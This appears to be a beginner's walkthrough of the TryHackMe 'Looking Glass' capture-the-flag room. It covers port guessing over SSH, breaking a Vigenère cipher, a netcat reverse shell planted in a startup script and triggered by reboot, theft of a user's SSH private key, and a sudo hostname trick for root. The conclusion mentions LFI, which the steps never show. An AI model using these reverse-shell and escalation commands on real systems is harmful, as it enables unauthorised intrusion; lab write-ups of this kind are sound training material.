# TryHackMe — Looking Glass 🪞
🔗 Room Link: [Looking Glass](https://tryhackme.com/room/lookingglass)

📁 Difficulty: Medium

👤 Author: [KRY](https://tryhackme.com/p/KRY)

# Introduction
In this write-up, we’ll walk through the Looking Glass room from TryHackMe. This box presents a fun and unusual path — from playing a “hot or cold” guessing game with SSH ports, to decrypting Vigenère cipher text, and escalating privileges using a clever hostname trick.

It’s a great room for beginners and those looking to sharpen their skills in CTF challenges, cryptanalysis, and Linux privilege escalation techniques.

## Reconnaissance
We start with an Nmap scan:
```python
nmap -A 10.10.152.219
```
The scan showed many open ports, most of them:  Dropbear SSHD
## Port Guessing Game
We used SSH to probe the open ports using:
```python
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa root@10.10.152.219 -p <port>
```
Depending on the port, we received different responses like Higher or Lower. This clearly indicated a port-guessing logic — similar to the hot and cold game.
After several attempts, we finally found the correct port — 13348 (note: this varies per instance).

## Vigenère Cipher Challenge
Upon connecting to the correct port, we received encrypted text. Using an online [Vigenère Cipher tool](https://www.boxentriq.com/code-breaking/vigenere-cipher), we configured the following settings:

* Min Key Length: 15

* Max Key Length: 20

* Iterations: 100

* Max Results: 20

After clicking Auto Solve, the tool provided a possible decryption key.
We then used [CyberChef](https://gchq.github.io/CyberChef/) to decode the ciphertext using the Vigenère Decode operation.
The result was a poem with a secret phrase at the end.

We submitted this phrase under the prompt:
```python
Enter Secret: ********
```
Which revealed SSH credentials:
```python
ssh jabberwock@10.10.152.219
```
## Jabberwock User Access
After logging in, we located the user.txt file. The content appeared reversed, so we used [CyberChef](https://gchq.github.io/CyberChef/) again with the Reverse function to decode it.

## Privilege Escalation (to tweedledum)
Running sudo -l revealed:
```python
User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
```
We found the script /home/jabberwock/twasBrillig.sh containing:
```python
wall $(cat /home/jabberwock/poem.txt)
```
We replaced the content of that file with a reverse shell:
```python
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc <Your-IP> 4444 >/tmp/f
```
Started listener:
```python
nc -lvnp 4444
```
Then triggered it via:
```python
sudo reboot
```
Shell as tweedledum obtained!
## Access to humptydumpty
We stabilized the shell with:
```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```
Found the file humptydumpty.txt in tweedledum's home directory. It contained SHA256 hashes.
We cracked the [hashes.com](https://hashes.com/en/decrypt/hash) using hashes.com and got the password.
Switched user:
```python
su humptydumpty
```
## Gaining Access to Alice
As humptydumpty, we could access /home/alice but couldn't list files.
However, we navigated to:
```python
cd /home/alice/.ssh
cat id_rsa
```
And found a private SSH key: id_rsa.
We used it to log in as alice:
```python
ssh -i id_rsa alice@10.10.152.219
```
## Root Access
We ran LinPEAS and found the following interesting sudo right:
```python
sudo -h ssalg-gnikool /bin/bash
```
Since ssalg-gnikool is "looking-glass" reversed, this worked!
We got a root shell and read:
```python
cat /root/root.txt
```
# 🏁 Conclusion
This was a creative room blending classic techniques like LFI, port scanning, and SSH enumeration with fun puzzle elements like the Vigenère cipher and wordplay.
> 🧠 This is my third write-up. I hope it was helpful and clear to follow!
